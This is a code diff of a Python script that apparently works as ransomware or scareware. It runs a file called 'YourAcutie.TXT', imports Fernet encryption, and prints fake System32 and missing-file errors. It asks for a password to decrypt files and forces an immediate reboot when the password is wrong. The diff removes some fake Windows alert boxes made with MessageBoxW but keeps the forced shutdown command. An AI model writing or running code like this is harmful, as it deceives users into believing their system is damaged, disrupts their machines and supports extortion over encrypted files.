@@ -2,11 +2,6 @@ import time
 from subprocess import call
 call(["python", "YourAcutie.TXT"])
 
-import ctypes
-ctypes.windll.user32.MessageBoxW(3, "Run Program", "YourAcutie.TXT asks", 32)
-time.sleep(10)
-ctypes.windll.user32.MessageBoxW(0, "YourAcutie.TXT has unexpectedly crashed", "Windows Alert", 16)
-
 import os
 from cryptography.fernet import Fernet
 
@@ -187,7 +182,7 @@ print(" ")
 print("ERROR")
 print("File [System32] Not found")
 time.sleep(15)
-  ctypes.windll.user32.MessageBoxW(0, "[System32] Folder Lost", "Computer", 16)
+print(" ")
 print("                                                          ")
 print("                        ▒▒▓▓████▓▓░░                      ")
 print("                    ██████████████████▒▒                  ")
@@ -235,7 +230,6 @@ call(["python", "FailSafe.py"])
 
 userInput = input("[ERROR] Files missing\n")
 time.sleep(2)
-ctypes.windll.user32.MessageBoxW(0, "Files Lost", "Computer", 16)
 
 # Checking the password that the user put in, if its right the user will get a message saying the files are decrypted 
 # and if its wrong a message saying that the password is wrong
@@ -252,5 +246,3 @@ else:
 	time.sleep(5)
 	print("Restarting your PC")
 	os.system("shutdown /r /t 1")	
-  ctypes.windll.user32.MessageBoxW(0, "Restarting your PC", "Computer", 16)
-os.system("shutdown /r /t 1")
